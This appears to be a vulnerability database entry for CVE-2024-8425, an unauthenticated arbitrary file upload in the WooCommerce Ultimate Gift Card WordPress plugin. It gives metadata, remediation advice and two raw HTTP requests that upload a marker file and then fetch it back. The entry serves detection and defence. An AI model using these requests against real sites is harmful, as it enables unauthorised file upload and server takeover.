---
layout: post
cve_id: CVE-2024-8425
title: WooCommerce Ultimate Gift Card ‚â§ 2.6.0 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2024/CVE-2024-8425.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-8425.yaml
snort2_rule: N/A
snort3_rule: N/A
author: jsnv-dev
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary files including PHP scripts
  to the server through insufficient file type validation, enabling remote code execution
  and complete server compromise.

  '
remediation: 'Update WooCommerce Ultimate Gift Card plugin to a version later than
  2.6.0 that addresses the arbitrary file upload vulnerability in the mwb_wgm_preview_mail
  and mwb_wgm_woocommerce_add_cart_item_data functions.

  '
reference:
- https://github.com/KTN1990/CVE-2024-8425
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/woocommerce-ultimate-gift-card/woocommerce-ultimate-gift-card-260-unauthenticated-arbitrary-file-upload
- https://nvd.nist.gov/vuln/detail/CVE-2024-8425
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-8425
  epss-score: 0.62585
  epss-percentile: 0.98301
  cwe-id: CWE-434
  cpe: cpe:2.3:a:wpswings:woocommerce_ultimate_gift_card:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: wpswings
  product: woocommerce_ultimate_gift_card
  fofa-query: body="/wp-content/plugins/woocommerce-ultimate-gift-card"
tags:
- cve
- cve2024
- wp
- wp-plugin
- wordpress
- woocommerce
- woocommerce-ultimate-gift-card
- file-upload
- vkev
- vuln
---

## üîç Vulnerability Description
The WooCommerce Ultimate Gift Card plugin for WordPress is vulnerable to arbitrary file uploads due to insufficient file type validation in the 'mwb_wgm_preview_mail' and 'mwb_wgm_woocommerce_add_cart_item_data' functions in all versions up to, and including, 2.6.0. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.


## üåê HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php?action=mwb_wgm_preview_mail HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Connection: close
Content-Length: 486
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary801937
Accept-Encoding: gzip

------WebKitFormBoundary801937
Content-Disposition: form-data; name="mwb_wgm_preview_email"

test
------WebKitFormBoundary801937
Content-Disposition: form-data; name="tempId"

1
------WebKitFormBoundary801937
Content-Disposition: form-data; name="message"

38ErccleSWwPRfKtAdTikVp6s8A
------WebKitFormBoundary801937
Content-Disposition: form-data; name="file"; filename="ElwXmPcr"
Content-Type: image/jpeg

38ErccleSWwPRfKtAdTikVp6s8A
------WebKitFormBoundary801937--
```

```nohighlight
GET /wp-content/uploads/mwb_browse/ElwXmPcr HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Connection: close
Accept-Encoding: gzip
```

